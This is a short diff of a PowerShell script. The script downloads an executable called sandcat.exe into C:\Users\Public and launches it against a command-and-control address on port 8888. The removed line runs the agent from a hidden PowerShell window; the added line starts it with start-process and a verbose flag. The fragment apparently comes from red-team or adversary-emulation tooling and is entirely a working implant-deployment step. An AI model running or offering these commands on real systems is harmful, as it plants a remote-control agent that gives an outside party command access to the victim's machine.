@@ -13,4 +13,4 @@ $wc.Headers.add("file","sandcat.go")
 $output="C:\Users\Public\sandcat.exe"
 $wc.DownloadFile($url,$output)
 
-powershell.exe -noP -sta -w 1 -command "C:\Users\Public\sandcat.exe -server http://$C2IPAddress`:8888 -group my_group"
+start-process C:\Users\Public\sandcat.exe -argument "-server http://$C2IPAddress`:8888 -group my_group -v"
